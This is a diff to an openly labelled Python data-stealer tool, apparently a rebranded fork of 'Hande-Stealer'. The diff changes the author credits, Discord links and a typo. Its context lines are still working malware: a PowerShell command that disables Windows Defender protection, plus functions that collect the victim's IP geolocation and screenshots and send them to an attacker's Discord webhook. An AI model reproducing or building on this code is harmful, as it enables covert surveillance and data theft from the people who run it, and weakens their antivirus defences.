@@ -26,18 +26,18 @@ os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
 
 hook = Webhook("https://Your Webhook Url") #change this
 embed = Embed(
-    description='Hande-Stealer From Swagkarna! :smiley:',
+    description='Sus Stuff Stealer From shin-kun! :smiley:',
     color=0x5CDBF0,
     timestamp='now'  
     )
-image1 = 'https://avatars.githubusercontent.com/u/79452028?s=460&u=0602f46611611527d9f4147aa67c47fa4b2fe739&v=4'
+image1 = 'https://cdn.discordapp.com/attachments/1171151575473983628/1190737726941691964/a4b607e1baf026abb2a894d7548ae102.jpg?ex=65a2e3ec&is=65906eec&hm=80e14f519214742092a62c1d236cb4554c615891b69c74880e1502891d5a7344&'
 
 
-embed.set_author(name='Author : swagkarna', icon_url=image1)
-embed.add_field(name='Github Profile', value='https://github.com/swagkarna')
+embed.set_author(name='Author : shin-kun', icon_url=image1)
+embed.add_field(name='Discord Profile', value='https://discord.com/users/1170640510029938731')
                 
-embed.add_field(name='Youtube', value='https://www.youtube.com/channel/UCszs81OmjgsLzNsgk3f4yxw')
-embed.set_footer(text='Happy Hacking', icon_url=image1)
+embed.add_field(name='Discord Server', value='https://discord.com/invite/zdspeR97cW')
+embed.set_footer(text='Dun steal my cookies!!!', icon_url=image1)
 
 embed.set_thumbnail(image1)
 
@@ -104,7 +104,7 @@ def stealip():
     {'name': 'Country', 'value': geo['country']},
     {'name': 'IPName', 'value': geo['ipName']},
     {'name': 'ISP', 'value': geo['isp']},
-    {'name': 'Latitute', 'value': geo['lat']},
+    {'name': 'Latitude', 'value': geo['lat']},
     {'name': 'Longitude', 'value': geo['lon']},
     {'name': 'Org', 'value': geo['org']},
     {'name': 'Region', 'value': geo['region']},
@@ -114,8 +114,6 @@ def stealip():
         if field['value']:
             embed.add_field(name=field['name'], value=field['value'], inline=True)
     hook.send(embed=embed)  
-
-
 def stealscreen() :
    try:
        
@@ -136,8 +134,8 @@ def stealscreen() :
     hook.send('Screenshots:', file=file)
 
     
-   	
-  		
+       
+          
    except:
     print("Error")
 
